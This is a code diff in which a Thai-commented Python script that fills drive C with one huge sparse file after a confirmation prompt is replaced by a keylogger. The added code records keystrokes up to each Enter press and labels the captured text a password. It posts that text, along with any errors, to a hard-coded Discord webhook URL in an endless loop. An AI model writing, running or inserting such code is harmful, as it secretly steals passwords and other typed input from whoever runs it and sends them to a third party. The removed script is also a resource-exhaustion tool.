@@ -1,56 +1,31 @@
-import os
-import shutil
-import sys
+import keyboard
+import requests
+import json
 
-def create_huge_file():
-    """
-    สร้างไฟล์ว่างขนาดใหญ่เท่ากับพื้นที่ที่เหลือของ Drive C บน Desktop
-    """
-    print("--- คำเตือนที่สำคัญมาก ---")
-    print("โปรแกรมนี้จะสร้างไฟล์ขนาดใหญ่จนเต็มพื้นที่ว่างบน Drive C:")
-    print("การกระทำนี้อาจทำให้ระบบทำงานช้าลง, ไม่เสถียร หรือหยุดทำงานได้!")
-    print("โปรดบันทึกงานทั้งหมดและปิดโปรแกรมที่ไม่จำเป็นก่อนดำเนินการต่อ")
-    print("-" * 28)
+# Define your webhook URL here
+WEBHOOK_URL = "https://discord.com/api/webhooks/1409220302231179284/imFcSXJiYJYRDgns75sV8739j1HsDOdcIGiC9KjO9BodgZ352hCxf1rXTWzX5KxvmRqJ"  # Replace with your actual webhook URL
 
-    # ถามเพื่อยืนยันการทำงาน
-    confirm = input("ต้องการดำเนินการต่อหรือไม่? (พิมพ์ 'y' เพื่อยืนยัน): ")
-    if confirm.lower() != 'y':
-        print("ยกเลิกการทำงาน")
-        return
-
+def send_to_webhook(data):
     try:
-        # 1. หาพื้นที่ว่างที่เหลืออยู่บนไดรฟ์ C:
-        print("\nกำลังตรวจสอบพื้นที่ว่างบน Drive C:...")
-        # shutil.disk_usage จะให้ข้อมูลเป็น bytes
-        total, used, free = shutil.disk_usage('C:\\')
-        
-        if free <= 0:
-            print("ไม่มีพื้นที่ว่างเหลือบนดิสก์")
-            return
-            
-        # แปลงเป็น GB เพื่อให้แสดงผลสวยงาม
-        free_gb = free / (1024**3)
-        print(f"พบพื้นที่ว่าง: {free_gb:.2f} GB")
-
-        # 2. หาตำแหน่งของ Desktop
-        # os.path.expanduser('~') จะได้ path ไปยัง home directory ของ user (เช่น C:\Users\YourUser)
-        desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
-        file_path = os.path.join(desktop_path, 'random.txt')
-        print(f"จะทำการสร้างไฟล์ที่: {file_path}")
-
-        # 3. สร้างไฟล์ขนาดใหญ่ด้วยวิธีที่รวดเร็ว (Sparse file)
-        print("กำลังสร้างไฟล์ขนาดใหญ่ โปรดรอสักครู่...")
-        with open(file_path, 'wb') as f:
-            # ย้าย cursor ไปยังตำแหน่งเกือบท้ายสุด
-            f.seek(free - 1)
-            # เขียนข้อมูล 1 byte ลงไปเพื่อให้ระบบจองพื้นที่ทั้งหมด
-            f.write(b'\0')
-
-        print("\nสร้างไฟล์ 'random.txt' สำเร็จ!")
-        print("!!! โปรดลบไฟล์นี้ทิ้งโดยเร็วที่สุดเพื่อคืนพื้นที่ให้ระบบ !!!")
-
+        payload = {"content": data}
+        response = requests.post(WEBHOOK_URL, json=payload)
+        if response.status_code == 200 or response.status_code == 204:
+            print("Successfully sent to webhook")
+        else:
+            print(f"Failed to send to webhook: {response.status_code}")
     except Exception as e:
-        print(f"เกิดข้อผิดพลาด: {e}", file=sys.stderr)
+        print(f"Error sending to webhook: {str(e)}")
 
-if __name__ == "__main__":
-    create_huge_file()
+while True:
+    try:
+        # Record key presses until 'enter' is pressed
+        events = keyboard.record('enter')
+        password = list(keyboard.get_typed_strings(events))
+        
+        if password:  # Check if there's any captured input
+            # Send the captured input to the webhook
+            send_to_webhook(password[0])
+            
+    except Exception as e:
+        # Log any errors to the webhook as well
+        send_to_webhook(f"Error in keylogger: {str(e)}")
